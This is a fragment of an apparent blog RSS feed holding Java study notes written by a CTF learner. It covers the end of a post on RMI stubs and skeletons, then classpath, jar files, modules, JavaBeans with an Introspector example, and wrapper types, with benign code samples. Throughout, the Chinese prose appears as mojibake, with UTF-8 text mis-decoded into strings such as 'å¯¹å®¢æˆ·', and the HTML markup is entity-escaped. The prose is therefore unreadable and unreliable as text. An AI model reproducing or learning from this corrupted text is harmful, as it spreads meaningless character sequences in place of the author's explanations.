&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹å®¢æˆ·ç«¯æ¥è¯´ï¼Œå®¢æˆ·ç«¯æŒæœ‰çš„&lt;code>WorldClock&lt;/code>æŽ¥å£å®žé™…ä¸Šå¯¹åº”äº†ä¸€ä¸ªâ€œå®žçŽ°ç±»â€ï¼Œå®ƒæ˜¯ç”±&lt;code>Registry&lt;/code>å†…éƒ¨åŠ¨æ€ç”Ÿæˆçš„ï¼Œå¹¶è´Ÿè´£æŠŠæ–¹æ³•è°ƒç”¨é€šè¿‡ç½‘ç»œä¼ é€’åˆ°æœåŠ¡å™¨ç«¯ã€‚è€ŒæœåŠ¡å™¨ç«¯æŽ¥æ”¶ç½‘ç»œè°ƒç”¨çš„æœåŠ¡å¹¶ä¸æ˜¯æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„&lt;code>WorldClockService&lt;/code>ï¼Œè€Œæ˜¯&lt;code>Registry&lt;/code>è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ã€‚æˆ‘ä»¬æŠŠå®¢æˆ·ç«¯çš„â€œå®žçŽ°ç±»â€ç§°ä¸º&lt;code>stub&lt;/code>ï¼Œè€ŒæœåŠ¡å™¨ç«¯çš„ç½‘ç»œæœåŠ¡ç±»ç§°ä¸º&lt;code>skeleton&lt;/code>ï¼Œå®ƒä¼šçœŸæ­£è°ƒç”¨æœåŠ¡å™¨ç«¯çš„&lt;code>WorldClockService&lt;/code>ï¼ŒèŽ·å–ç»“æžœï¼Œç„¶åŽæŠŠç»“æžœé€šè¿‡ç½‘ç»œä¼ é€’ç»™å®¢æˆ·ç«¯&lt;/p>
&lt;p>RMIé€šè¿‡è‡ªåŠ¨ç”Ÿæˆstubå’Œskeletonå®žçŽ°ç½‘ç»œè°ƒç”¨ï¼Œå®¢æˆ·ç«¯åªéœ€è¦æŸ¥æ‰¾æœåŠ¡å¹¶èŽ·å¾—æŽ¥å£å®žä¾‹ï¼ŒæœåŠ¡å™¨ç«¯åªéœ€è¦ç¼–å†™å®žçŽ°ç±»å¹¶æ³¨å†Œä¸ºæœåŠ¡&lt;/p>
&lt;p>æ•´ä¸ªè¿‡ç¨‹ç”±RMIåº•å±‚è´Ÿè´£å®žçŽ°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨é—®é¢˜&lt;/p>
&lt;hr>
&lt;p>å…¶å®ƒçš„è¯­æ³•ç­‰é‡åˆ°äº†å†å­¦ï¼Œä¼°è®¡è¿˜ä¼šæœ‰ä¸ªJavaè¯­æ³•è¡¥å…¨ä¸‹ç¯‡ï¼ˆå¦‚æžœæˆ‘ä¸æ‡’çš„è¯&lt;/p></description></item><item><title>Javaå­¦ä¹ ç¬”è®°â… </title><link>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</link><pubDate>Sun, 27 Feb 2022 01:28:17 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</guid><description>&lt;p>ctfé‡Œæœ‰å‡ ç±»é¢˜æˆ‘æ˜¯è§åˆ°ä¹‹åŽæ‹”è…¿å°±è·‘ï¼Œæ¯”å¦‚javaå’Œxssï¼Œå¯¹äºŽåŽè€…ï¼Œæœ€è¿‘æ‚ä¸ƒæ‚å…«çš„å­¦äº†å¾ˆå¤šjså’Œå‰ç«¯çš„çŸ¥è¯† æ²¡é‚£ä¹ˆå‘æ€µäº†ï¼Œè€Œå‰è€…â€¦â€¦ä¸å¤šè¯´äº†ï¼Œå­¦å­¦å­¦ï¼&lt;/p>
&lt;p>æœ¬ç¯‡å­¦ä¹ å†…å®¹æ¥è‡ªäºŽ&lt;a href="https://www.liaoxuefeng.com/wiki/1252599548343744">å»–é›ªå³°Javaæ•™ç¨‹&lt;/a>ï¼Œä¸ªäººæ„Ÿè§‰æ¯”è¾ƒé€‚åˆå¯¹å…¶å®ƒè¯­è¨€ä¹Ÿæœ‰ä¸€ç‚¹æŽŒæ¡çš„äºº&lt;/p>
&lt;p>æœ¬æœºwin10ï¼Œä¸ºäº†å…¼å®¹ä¸€äº›ç¨‹åºæš‚æ—¶æœ‰java8å’Œ11ä¸¤ä¸ªç‰ˆï¼›ideä½¿ç”¨idea&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220226170711379.png" alt="image-20220226170711379">&lt;/p>
&lt;hr>
&lt;h2 id="javaåŸºç¡€">JavaåŸºç¡€&lt;/h2>
&lt;h3 id="javaç¨‹åºç»“æž„">javaç¨‹åºç»“æž„&lt;/h3>
&lt;ul>
&lt;li>src/xxx.javaï¼Œç±»åä¸ºæ–‡ä»¶åï¼Œmainä¸ºå…¥å£ï¼ˆideaç›´æŽ¥è¾“mainä¼šè‡ªåŠ¨è¡¥å…¨ï¼‰ï¼Œideaæ ¼å¼åŒ–ä»£ç ctrl+shift+F&lt;/li>
&lt;li>ç±»classä¹ æƒ¯å¤§å†™å­—æ¯å¼€å¤´ï¼Œæ–¹æ³•methodä¹ æƒ¯å°å†™å­—æ¯å¼€å¤´ï¼Œå¿…é¡»å¸¦åˆ†å·ï¼ˆä¸åŒäºŽjså¯æœ‰å¯æ— ï¼‰&lt;/li>
&lt;/ul>
&lt;h3 id="classpathjar">classpath&amp;amp;jar&lt;/h3>
&lt;ul>
&lt;li>&lt;code>classpath&lt;/code>æ˜¯JVMçš„çŽ¯å¢ƒå˜é‡ï¼Œæ˜¯ä¸€ç»„ç›®å½•çš„é›†åˆï¼ˆåˆ†éš”ç¬¦ç”±ç³»ç»Ÿå®š&lt;/li>
&lt;li>æŽ¨èåœ¨å¯åŠ¨JVMæ—¶è®¾ç½®&lt;code>classpath&lt;/code>å˜é‡ï¼Œä¸è¦æ±¡æŸ“ç³»ç»ŸçŽ¯å¢ƒï¼ˆå¯ä»¥æ”¾å¿ƒçš„äº¤ç»™idea&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -classpath .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>java -cp .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>ä¸è¦æŠŠä»»ä½•Javaæ ¸å¿ƒåº“æ·»åŠ åˆ°classpathä¸­ï¼é»˜è®¤çš„å½“å‰ç›®å½•&lt;code>.&lt;/code>å¯¹äºŽç»å¤§å¤šæ•°æƒ…å†µéƒ½å¤Ÿç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jaråŒ…å®žé™…ä¸Šå°±æ˜¯ä¸€ä¸ªzipæ ¼å¼çš„åŽ‹ç¼©æ–‡ä»¶ï¼ŒåŒ…å«&lt;code>package&lt;/code>ç»„ç»‡çš„ç›®å½•å±‚çº§ï¼Œä»¥åŠå„ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬&lt;code>.class&lt;/code>æ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ï¼‰ï¼Œæ³¨æ„ä¸å«&lt;code>bin&lt;/code>ç›®å½•ï¼ˆæ³¨æ„å±‚çº§ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯ä»¥æŠŠjarç†è§£ä¸ºnå¤šä¸ªclassæ–‡ä»¶çš„å®¹å™¨ï¼ŒJVMè‡ªå¸¦çš„Javaæ ‡å‡†åº“rt.jarä¹Ÿæ˜¯ä»¥jarå½¢å¼è¿›è¡Œå­˜æ”¾&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jarä¸å…³å¿ƒclassä¹‹é—´çš„ä¾èµ–ï¼Œå¦‚æžœæ¼æŽ‰çš„è¯åœ¨è¿è¡ŒæœŸæžæœ‰å¯èƒ½æŠ›å‡º&lt;code>ClassNotFoundException&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æžœæˆ‘ä»¬è¦æ‰§è¡Œä¸€ä¸ªjaråŒ…çš„&lt;code>class&lt;/code>ï¼Œå°±å¯ä»¥æŠŠjaråŒ…æ”¾åˆ°&lt;code>classpath&lt;/code>ä¸­&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -cp ./hello.jar abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>MANIFEST.MF&lt;/code>æ–‡ä»¶å¯ä»¥æä¾›jaråŒ…çš„ä¿¡æ¯ï¼Œå¦‚&lt;code>Main-Class&lt;/code>&lt;/li>
&lt;li>åˆ†æžé¢˜ç›®ä¸­ç»™å‡ºjaråŒ…æ—¶æˆ‘ä¸€èˆ¬ç›´æŽ¥æ”¹zipè§£åŽ‹ï¼Œç”¨ideaæ‰“å¼€æ•´ä¸ªç›®å½•ä½œä¸ºé¡¹ç›®ï¼ˆidea yyds&lt;/li>
&lt;/ul>
&lt;h3 id="æ¨¡å—">æ¨¡å—&lt;/h3>
&lt;ul>
&lt;li>Java9åŽå¼•å…¥ï¼Œè§£å†³ä¾èµ–é—®é¢˜ï¼ŒæŽ§åˆ¶jarä¹‹é—´çš„ç›¸äº’è°ƒç”¨&lt;/li>
&lt;li>æŠŠä¸€å †classå°è£…ä¸ºjarä»…ä»…æ˜¯ä¸€ä¸ªæ‰“åŒ…çš„è¿‡ç¨‹ï¼Œè€ŒæŠŠä¸€å †classå°è£…ä¸ºæ¨¡å—åˆ™ä¸ä½†éœ€è¦æ‰“åŒ…ï¼Œè¿˜éœ€è¦å†™å…¥ä¾èµ–å…³ç³»ï¼Œå¹¶ä¸”è¿˜å¯ä»¥åŒ…å«äºŒè¿›åˆ¶ä»£ç ï¼ˆé€šå¸¸æ˜¯JNIæ‰©å±•ï¼‰&lt;/li>
&lt;li>ä»¥javaçš„æ ‡å‡†åº“rt.jarä¸ºä¾‹ï¼Œè¢«æ‹†ä¸º&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>java.base.jmod
java.compiler.jmod
java.datatransfer.jmod
java.desktop.jmod
...
&lt;/code>&lt;/pre>&lt;p>ä»¥&lt;code>.jmod&lt;/code>ä¸ºæ‹“å±•åæ ‡è¯†ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæ¨¡å—&lt;code>java.base&lt;/code>å¯¹åº”çš„æ–‡ä»¶å°±æ˜¯&lt;code>java.base.jmod&lt;/code>&lt;/p>
&lt;ul>
&lt;li>æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å·²ç»è¢«å†™å…¥åˆ°æ¨¡å—å†…çš„&lt;code>module-info.class&lt;/code>æ–‡ä»¶äº†ã€‚æ‰€æœ‰çš„æ¨¡å—éƒ½ç›´æŽ¥æˆ–é—´æŽ¥åœ°ä¾èµ–&lt;code>java.base&lt;/code>æ¨¡å—ï¼Œåªæœ‰&lt;code>java.base&lt;/code>æ¨¡å—ä¸ä¾èµ–ä»»ä½•æ¨¡å—ï¼Œå®ƒå¯ä»¥è¢«çœ‹ä½œæ˜¯æ ¹æ¨¡å—ï¼Œå¥½æ¯”æ‰€æœ‰çš„ç±»éƒ½æ˜¯ä»Ž&lt;code>Object&lt;/code>ç›´æŽ¥æˆ–é—´æŽ¥ç»§æ‰¿è€Œæ¥&lt;/li>
&lt;/ul>
&lt;p>ç¼–å†™æ¨¡å—çš„éƒ¨åˆ†æš‚ç•¥ã€‚&lt;/p>
&lt;h3 id="javabean">JavaBean&lt;/h3>
&lt;p>æŒ‡çš„æ˜¯ç¬¦åˆæŸç§è§„èŒƒçš„ä¸€ç§ç¼–ç¨‹æ¨¡å¼æˆ–ç¼–ç¨‹æ€æƒ³ï¼ˆä¸ªäººç†è§£&lt;/p>
&lt;p>éƒ¨åˆ†Pythonçˆ±å¥½è€…ä¹Ÿå–œæ¬¢è¿™ä¹ˆå†™ï¼Œå¯æ‹“å±•æ€§å¼ºï¼Œå°±æ˜¯å¾ˆè‡ƒè‚¿&lt;/p>
&lt;ul>
&lt;li>å†™æ–¹æ³•&lt;code>setter&lt;/code>ï¼Œè¯»æ–¹æ³•&lt;code>getter&lt;/code>ï¼Œåªæœ‰å…¶ä¸­ä¸€ç§å±žæ€§ä¹‹ä¸€çš„è¢«ç§°ä¸ºåªå†™/è¯»å±žæ€§â€”â€”æ»¡è¶³è¿™æ ·è§„èŒƒçš„classè¢«ç§°ä¸ºJavaBean&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¯»æ–¹æ³•:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#75af00">getXyz&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™æ–¹æ³•:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setXyz&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>è¦æžšä¸¾ä¸€ä¸ªJavaBeançš„æ‰€æœ‰å±žæ€§ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨Javaæ ¸å¿ƒåº“æä¾›çš„&lt;code>Introspector&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.beans.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">BeanInfo&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Introspector&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBeanInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// èŽ·å–å±žæ€§åˆ—è¡¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">PropertyDescriptor&lt;/span> &lt;span style="color:#111">pd&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">info&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPropertyDescriptors&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getReadMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">pd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriteMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getAge&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setAge&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="è¯­æ³•åŸºç¡€">è¯­æ³•åŸºç¡€&lt;/h2>
&lt;h3 id="å˜é‡æ•°æ®ç±»åž‹">å˜é‡&amp;amp;æ•°æ®ç±»åž‹&lt;/h3>
&lt;ul>
&lt;li>ç±»ä¼¼cçš„èµ‹å€¼é£Žæ ¼ï¼š&lt;code>ç±»åž‹ å˜é‡å = å˜é‡å€¼&lt;/code>ï¼ˆä¸åŒäºŽgoï¼‰&lt;/li>
&lt;li>ç¨‹åºè®¾è®¡çš„ä¸€ä¸ªé‡è¦åŽŸåˆ™ï¼šæ•°æ®çš„å­˜å‚¨å’Œæ˜¾ç¤ºè¦åˆ†ç¦»&lt;/li>
&lt;li>æ‰§è¡Œ&lt;code>int x = n&lt;/code>è¿™æ ·çš„å˜é‡èµ‹å€¼æ—¶ï¼Œç›¸å½“äºŽä¸¤æ­¥æ“ä½œï¼Œxä¸Žnæ˜¯ä¸åŒçš„å­˜å‚¨å•å…ƒ&lt;/li>
&lt;li>åŸºæœ¬ç±»åž‹æœ‰&lt;code>byte&lt;/code>, &lt;code>int&lt;/code>, &lt;code>short&lt;/code>, &lt;code>long&lt;/code>, &lt;code>float&lt;/code>, &lt;code>double&lt;/code>, &lt;code>boolean&lt;/code>, &lt;code>char&lt;/code>ï¼ˆè¡¨ç¤ºasciiæˆ–ä¸€ä¸ªUnicodeå­—ç¬¦ï¼‰ï¼Œä¸å¯èµ‹å€¼null&lt;/li>
&lt;li>å¼•ç”¨ç±»åž‹ä¸ºæ‰€æœ‰classå’Œinterfaceç±»åž‹ï¼Œå¯èµ‹å€¼ä¸ºnullè¡¨ç¤ºç©º&lt;/li>
&lt;li>ä½¿ç”¨å¯¹åº”çš„Wrapper ClassåŒ…è£…ç±»å¯ä»¥å°†åŸºæœ¬ç±»åž‹è§†ä¸ºå¼•ç”¨ç±»åž‹(class)ï¼Œå¥½å¤„æ˜¯å¯ä»¥ä½¿ç”¨å¤§é‡çš„å®žç”¨æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">100&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// é€šè¿‡newæ“ä½œç¬¦åˆ›å»ºIntegerå®žä¾‹(ä¸æŽ¨èä½¿ç”¨,ä¼šæœ‰ç¼–è¯‘è­¦å‘Š):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// é€šè¿‡é™æ€æ–¹æ³•valueOf(int)åˆ›å»ºIntegerå®žä¾‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// é€šè¿‡é™æ€æ–¹æ³•valueOf(String)åˆ›å»ºIntegerå®žä¾‹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;100&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
